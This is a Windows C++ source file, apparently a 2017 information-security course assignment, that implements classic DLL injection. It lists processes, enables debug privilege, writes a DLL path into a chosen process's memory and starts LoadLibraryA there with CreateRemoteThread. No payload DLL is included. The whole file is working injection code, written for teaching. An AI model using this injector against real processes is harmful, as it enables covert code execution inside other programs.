// ChinaUnixSourceCode.cpp : 定义控制台应用程序的入口点。
/**
author:xiajun
time:15th,June.2017
高级信息安全课程编程作业：DLL远程注入攻击+API挂钩
这里的API挂钩采用的是本进程内部的API挂钩
**/

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>

//获取当前系统进程
int ListProcess()
{
    //获取系统快照
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //不要写错CreateToolhelp32Snapshot()
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
       printf("CreateToolHelp32Snapshot error!\n");
       return -1;
    }
 
    //创建单个进程快照结构体，初始化大小
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);  //务必提前初始化，否则默认的大小不一定满足要求
 
    //初始化缓冲区
    WCHAR buff[1024] = {0}; //PROCESSENTRY32中的szExeFile为WCHAR类型数组，此处应一致，使用Unicode码
 
    //枚举系统快照链表中的第一个进程项目
    BOOL bProcess = Process32First(hProcessSnap, &pe32);
    while (bProcess)
    {
 
       //格式化进程名和进程ID，这里要使用printf的宽字符版
       //格式字符串“”都需要用L转换为宽字符形式
       wsprintf(buff, L"FileName:%-30sID:%-6d\r\n", pe32.szExeFile, pe32.th32ProcessID);
       wprintf(L"%s\n",buff);
       //缓冲区复位
       memset(buff, 0, sizeof(buff));
       //继续枚举下一个进程
       bProcess = Process32Next(hProcessSnap, &pe32);
    }
 
    CloseHandle(hProcessSnap);
    return 0;
}

//提升权限
int EnableDebugPriv(const WCHAR *name)
{
    HANDLE hToken;   //进程令牌句柄
    TOKEN_PRIVILEGES tp;  //TOKEN_PRIVILEGES结构体，其中包含一个【类型+操作】的权限数组
    LUID luid;       //上述结构体中的类型值
 
    //打开进程令牌环
    //GetCurrentProcess()获取当前进程的伪句柄，只会指向当前进程或者线程句柄，随时变化
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken))
    {
       printf("OpenProcessToken error\n");
       return -8;
    }
 
    //获得本地进程name所代表的权限类型的局部唯一ID
    if (!LookupPrivilegeValue(NULL, name, &luid))
    {
       printf("LookupPrivilegeValue error\n");
    }
 
    tp.PrivilegeCount = 1;    //权限数组中只有一个“元素”
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  //权限操作
    tp.Privileges[0].Luid = luid;   //权限类型
 
    //调整进程权限
    if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
       printf("AdjustTokenPrivileges error!\n");
       return -9;
    }
 
    return 0;
}



int main()
{
	
    //为了成功使用CreateRemoteThread()函数，必须：
    //1.利用OpenProcess()获得远程进程的句柄
    //2.利用VirtualAllocEx(),WriteProcessMemory()写入DLL路径字符串
    //3.获得远程进程中LoadLibrary()的确切地址
 
    //输入进程ID获得进程句柄
    char YesNo;
    printf("是否查看当前进程列表获得进程ID: y or n?");
    scanf("%c", &YesNo);
    Sleep(250);
    if (YesNo == 'y')
       ListProcess();
    printf("请输入要注入的进程ID：\n");
    DWORD dwRemoteProcessId;
    scanf("%d",&dwRemoteProcessId);
 
    //获得调试权限
    if (EnableDebugPriv(SE_DEBUG_NAME))
    {
       printf("Add Privilege error\n");
       return -1;
    }

    //获取要注入的目标进程的句柄
    HANDLE hRemoteProcess;
    if ((hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId)) == NULL)
    {
       printf("获取目标进程句柄失败\n");
       return -2;
    }
 
    //在远程进程中分配内存，准备拷入DLL路径字符串
    //取得当前DLL路径
    char DllPath[260]; //Windows路径最大为
   
    strcpy(DllPath, "E:\\IDE\\VC6.0\\MyProject\\CalculateComplexity\\Debug\\MyDll.dll"); //链接到DLL路径
    LPVOID pRemoteDllPath = VirtualAllocEx(hRemoteProcess, NULL, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteDllPath == NULL)
    {
       printf("在远程进程中分配地址空间失败\n");
       return -3;
    }
 
    //向远程进程空间中写入DLL路径字符串
    printf("DllPath is %s\n", DllPath);
    DWORD Size;
    if (WriteProcessMemory(hRemoteProcess, pRemoteDllPath, DllPath, strlen(DllPath) +1, &Size) == NULL)
    {
       printf("写入DLL路径名到远程进程地址空间失败\n");
       return -4;
    }
    printf("WriteRrmoyrProcess Size is %d\n\n", Size);
 
    //获得远程进程中LoadLibrary()的地址
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
    if (pLoadLibrary == NULL)
    {
       printf("获取LoadLibraryW的真实地址失败\n");
       return -5;
    }
    else
    {
       printf("LoadLibraryW的真实地址是: 0x%x\n\n", pLoadLibrary);
    }
 
    //启动远程线程
    DWORD dwThreadId;
    HANDLE hThread;
    if ((hThread = CreateRemoteThread(hRemoteProcess, NULL, 0, pLoadLibrary, pRemoteDllPath, 0, &dwThreadId)) == NULL)
    {
       printf("创建远程线程失败\n");
       return -6;
    }
    else
    {
    WaitForSingleObject(hThread, INFINITE);
    printf("dwThreadId is %d\n\n", dwThreadId);
    printf("Inject is done\n");
    }
 
    //释放分配内存
    if (VirtualFreeEx(hRemoteProcess, pRemoteDllPath, 0, MEM_RELEASE) == 0)
    {
       printf("VitualFreeEx error\n");
       return -8;
    }
 
    //释放句柄
    if (hThread != NULL) CloseHandle(hThread);
    if (hRemoteProcess != NULL) CloseHandle(hRemoteProcess);
 
    system("pause");
    return 0;
}

